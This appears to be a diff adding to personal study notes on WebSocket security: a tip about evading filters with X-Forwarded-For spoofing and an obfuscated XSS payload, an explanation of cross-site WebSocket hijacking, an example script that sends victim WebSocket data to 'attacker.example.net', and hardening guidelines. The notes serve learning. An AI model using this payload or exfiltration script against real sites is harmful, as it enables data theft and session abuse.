@@ -54,4 +54,54 @@ vuln that arises from manipulating handshakes
     Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message.
     Attack surface introduced by custom HTTP headers used by the application.
 
+note #
+spoofing the ip address with the x forwarded for header 
+with an obufscated payload does the trick 
+e.g <img src=1 oNeRrOr=alert`1`>
+
+
+
+Using cross-site WebSockets to exploit vulnerabilities
+==
+
+Some WebSockets security vulnerabilities arise when an attacker makes a cross-domain WebSocket connection from a web site that the attacker controls. This is known as a cross-site WebSocket hijacking attack, and it involves exploiting a cross-site request forgery (CSRF) vulnerability on a WebSocket handshake. The attack often has a serious impact, allowing an attacker to perform privileged actions on behalf of the victim user or capture sensitive data to which the victim user has access. 
+
+
+what!!!
+==
+???
+Cross-site WebSocket hijacking (also known as cross-origin WebSocket hijacking) involves a cross-site request forgery (CSRF) vulnerability on a WebSocket handshake. It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values. 
+
+
+
+If the WebSocket handshake is not correctly protected using a CSRF token or a nonce, it's possible to use the authenticated WebSocket of a user on an attacker's controlled site because the cookies are automatically sent by the browser. This attack is called Cross-Site WebSocket Hijacking (CSWSH).
+
+Example exploit, hosted on an attacker's server, that exfiltrates the received data from the WebSocket to the attacker:
+
+
+
+<script>
+  ws = new WebSocket('wss://vulnerable.example.com/messages');
+  ws.onopen = function start(event) {
+    ws.send("HELLO");
+  }
+  ws.onmessage = function handleReply(event) {
+    fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});
+  }
+  ws.send("Some text sent to the server");
+</script>
+
+
+
+
+
+
+How to secure a WebSocket connection
+==
+To minimize the risk of security vulnerabilities arising with WebSockets, use the following guidelines:
+
+    Use the wss:// protocol (WebSockets over TLS).
+    Hard code the URL of the WebSockets endpoint, and certainly don't incorporate user-controllable data into this URL.
+    Protect the WebSocket handshake message against CSRF, to avoid cross-site WebSockets hijacking vulnerabilities.
+    Treat data received via the WebSocket as untrusted in both directions. Handle data safely on both the server and client ends, to prevent input-based vulnerabilities such as SQL injection and cross-site scripting.
 
